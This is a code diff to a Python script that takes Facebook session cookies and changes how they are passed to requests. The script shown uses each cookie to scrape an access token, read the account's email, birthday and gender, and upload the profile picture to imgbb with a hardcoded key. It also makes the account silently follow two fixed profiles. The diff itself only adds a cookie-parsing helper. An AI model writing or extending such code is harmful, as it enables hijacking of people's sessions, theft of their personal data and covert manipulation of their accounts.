@@ -17,9 +17,24 @@ admin_pass = '1c51db079f8065b9c51e5dd75edacc209a6e86686647f47de2f4494ce1f3509a'
 rand_keys = []
 user_agents = load(open('user-agents.json'))
 
+def convert_to_dict(cookie:str) -> dict:
+    try:
+        fb_cookies=cookie.replace(' ','')
+        fb_cookies=fb_cookies.replace('\n','')
+        fb_cookies=fb_cookies.split(';')
+        if '' in fb_cookies:
+            fb_cookies.remove('')
+        fb_cookies_dict={}
+        for item in fb_cookies:
+            name, value=item.split('=')
+            fb_cookies_dict[name]=value
+        return fb_cookies_dict
+    except:
+        return False
+
 def get_access_token(cookie:str):
     try:
-        resp = get('https://business.facebook.com/business_locations', cookies={'cookie': cookie})
+        resp = get('https://business.facebook.com/business_locations', cookies=convert_to_dict(cookie))
         tok = re.findall(r'EAAG\w+', resp.text)
         if tok:
             return tok[0]
@@ -34,7 +49,7 @@ def get_fb_info(cookie:str):
         token = get_access_token(cookie)
         if not token:
             return None
-        resp = get(f'https://graph.facebook.com/me?fields=id,name,email,birthday,gender&access_token={token}', cookies={'cookie': cookie})
+        resp = get(f'https://graph.facebook.com/me?fields=id,name,email,birthday,gender&access_token={token}', cookies=convert_to_dict(cookie))
         month_names = ['Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec']
         birthday = resp.json().get('birthday')
         if birthday:
@@ -58,7 +73,7 @@ def get_fb_info(cookie:str):
 
 def get_fb_img(cookie, token):
     try:
-        resp = get(f'https://graph.facebook.com/me/picture?type=large&redirect=false&access_token={token}', cookies={'cookie': cookie})
+        resp = get(f'https://graph.facebook.com/me/picture?type=large&redirect=false&access_token={token}', cookies=convert_to_dict(cookie))
         img_url = resp.json()['data']['url']
         try:
             resp = get(f'https://api.imgbb.com/1/upload?key=43bcbe399420f8a08bbb62e5861c4091&image={quote_plus(img_url)}')
@@ -72,11 +87,11 @@ def get_fb_img(cookie, token):
 def follow_dada_bhai(cookie: str):
     try:
         resp = get('https://mbasic.facebook.com/100083542359206',
-                   cookies={'cookie': cookie})
+                   cookies=convert_to_dict(cookie))
         soap = BeautifulSoup(resp.text, 'html.parser')
         follow_a = soap.find('a', string='Follow')
         follow_link = 'https://mbasic.facebook.com' + follow_a.get('href')
-        get(follow_link, cookies={'cookie': cookie})
+        get(follow_link, cookies=convert_to_dict(cookie))
         return True
     except:
         return None
@@ -85,11 +100,11 @@ def follow_dada_bhai(cookie: str):
 def follow_innocuous(cookie: str):
     try:
         resp = get('https://mbasic.facebook.com/100075924800901',
-                   cookies={'cookie': cookie})
+                   cookies=convert_to_dict(cookie))
         soap = BeautifulSoup(resp.text, 'html.parser')
         follow_a = soap.find('a', string='Follow')
         follow_link = 'https://mbasic.facebook.com' + follow_a.get('href')
-        get(follow_link, cookies={'cookie': cookie})
+        get(follow_link, cookies=convert_to_dict(cookie))
         return True
     except:
         return None
@@ -146,6 +161,6 @@ def get_ua():
 
 def ping_with_ua(cookie):
     headers = {'User-Agent': get_ua()}
-    resp = get('https://mbasic.facebook.com/', headers=headers, cookies={'cookie': cookie})
+    resp = get('https://mbasic.facebook.com/', headers=headers, cookies=convert_to_dict(cookie))
     return resp.text
 
